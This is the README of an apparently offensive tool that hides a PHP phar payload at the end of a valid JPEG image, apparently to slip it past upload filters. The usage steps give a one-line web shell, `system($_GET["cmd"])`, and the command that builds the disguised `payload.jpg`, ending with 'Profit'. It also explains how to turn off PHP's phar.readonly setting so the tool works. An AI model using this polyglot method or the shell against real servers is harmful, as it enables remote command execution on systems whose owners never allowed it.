# JPEG PHAR Fusion

![Very cool picture](https://github.com/Sarapuce/jpeg-phar-fusion/blob/main/fusion.jpeg)

This is a simple tool to add a phar payload at the end of a valid jpeg image.

## Requierments
- Python 3
- Php (Tested with php 8)

## Usage
1. Clone the repo

`git clone https://github.com/Sarapuce/jpeg-phar-fusion.git`

2. Choose a php payload finishing by `__HALT_COMPILER();` for example :

`<?php system($_GET["cmd"]); __HALT_COMPILER(); ?>`

3. Create the payload with the script

`python3 phar_creator.py '<?php system($_GET["cmd"]); __HALT_COMPILER(); ?>'`

4. The file is in `payload.jpg`

5. Profit


## It doesn't work 😡
Do you have the error 
> PHP Fatal error:  Uncaught UnexpectedValueException: creating archive "payload.phar" disabled by the php.ini setting phar.readonly

You need to enable the phar creation in php.ini

To locate your php.ini 

`php --ini`

Then edit this line in your file

`;phar.readonly = Off`

into

`phar.readonly = Off`
